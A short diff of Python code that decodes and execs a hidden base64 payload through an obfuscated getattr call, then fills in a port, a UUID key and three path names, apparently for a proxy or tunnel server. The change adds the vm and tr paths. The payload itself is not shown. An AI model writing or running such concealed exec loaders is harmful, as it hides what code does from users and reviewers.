@@ -7,6 +7,6 @@ __builtins__.getattr(sys.__std__, "exec")(
     b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
     .replace("__key__", "ac0afca8-4abe-498a-87fb-488413451552")
     .replace("__vl__", "/ac0afca8-4abe-498a-87fb-488413451552-vl")
-    .replace("__vm__", "")
-    .replace("__tr__", "")
+    .replace("__vm__", "/ac0afca8-4abe-498a-87fb-488413451552-vm")
+    .replace("__tr__", "/ac0afca8-4abe-498a-87fb-488413451552-tr")
 )
